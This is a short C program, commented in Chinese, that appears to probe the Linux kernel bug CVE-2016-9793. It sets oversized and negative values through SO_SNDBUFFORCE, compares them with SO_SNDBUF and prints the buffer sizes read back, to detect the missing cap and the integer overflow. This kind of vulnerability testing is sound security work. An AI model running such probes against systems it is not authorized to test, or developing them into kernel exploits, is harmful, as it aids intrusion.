/* SPDX-License-Identifier: GPL-3.0-or-later */

/* CVE-2016-9793 实测：SO_SNDBUFFORCE 的 val*2 整数溢出（P4.64）
 *
 * 源码形态（net/core/sock.c）：
 *   case SO_SNDBUFFORCE: if (!capable(CAP_NET_ADMIN)) EPERM; goto set_sndbuf;
 *   ...
 *   set_sndbuf: sk->sk_sndbuf = max_t(int, val * 2, SOCK_MIN_SNDBUF);
 * SO_SNDBUF 路径有 `val = min_t(u32, val, sysctl_wmem_max)`，SO_SNDBUFFORCE 没有。
 *
 * 判据：
 *   - SO_SNDBUFFORCE 能设到远超 wmem_max 的值 → 上限检查缺失（漏洞形态成立）
 *   - val = 0x7FFFFFFF 时 val*2 溢出为负，看 getsockopt 回报什么
 *   - 与 SO_SNDBUF（受 wmem_max 限制）对照
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>

#ifndef SO_SNDBUFFORCE
#define SO_SNDBUFFORCE 32
#endif

static void probe(int fd, int opt, const char *name, int val)
{
	int got = -12345;
	socklen_t len = sizeof(got);
	int r;

	errno = 0;
	r = setsockopt(fd, SOL_SOCKET, opt, &val, sizeof(val));
	if (r < 0) {
		printf("  %-14s val=%-12d setsockopt: %s\n", name, val, strerror(errno));
		return;
	}
	if (getsockopt(fd, SOL_SOCKET, SO_SNDBUF, &got, &len) < 0) {
		printf("  %-14s val=%-12d getsockopt: %s\n", name, val, strerror(errno));
		return;
	}
	/* sk_sndbuf 回读 = 内核里实际存的值 */
	printf("  %-14s val=%-12d -> sk_sndbuf=%d (0x%x)%s\n",
	       name, val, got, (unsigned)got,
	       (got > 0 && got > 0x40000000) ? "  <-- 超大" : "");
}

int main(void)
{
	int fd, wmem = 0;
	FILE *f;

	setvbuf(stdout, NULL, _IONBF, 0);
	printf("=== CVE-2016-9793 SO_SNDBUFFORCE overflow probe ===\n");
	printf("uid=%d euid=%d\n", getuid(), geteuid());

	/* 先读 wmem_max 作为对照基准 */
	if ((f = fopen("/proc/sys/net/core/wmem_max", "r"))) {
		if (fscanf(f, "%d", &wmem) != 1) wmem = -1;
		fclose(f);
	}
	printf("net.core.wmem_max = %d\n", wmem);

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0) { printf("[!] socket: %s\n", strerror(errno)); return 1; }

	printf("[A] SO_SNDBUF（应受 wmem_max 限制）:\n");
	probe(fd, SO_SNDBUF, "SO_SNDBUF", 0x7FFFFFFF);
	close(fd);

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0) { printf("[!] socket: %s\n", strerror(errno)); return 1; }

	printf("[B] SO_SNDBUFFORCE（无上限 => 漏洞形态）:\n");
	probe(fd, SO_SNDBUFFORCE, "FORCE 0x7FFFFFFF", 0x7FFFFFFF);
	probe(fd, SO_SNDBUFFORCE, "FORCE 0x40000000", 0x40000000);
	probe(fd, SO_SNDBUFFORCE, "FORCE 0x3FFFFFFF", 0x3FFFFFFF);
	probe(fd, SO_SNDBUFFORCE, "FORCE -1", -1);
	probe(fd, SO_SNDBUFFORCE, "FORCE 0x10000000", 0x10000000);
	close(fd);

	printf("=== done ===\n");
	return 0;
}
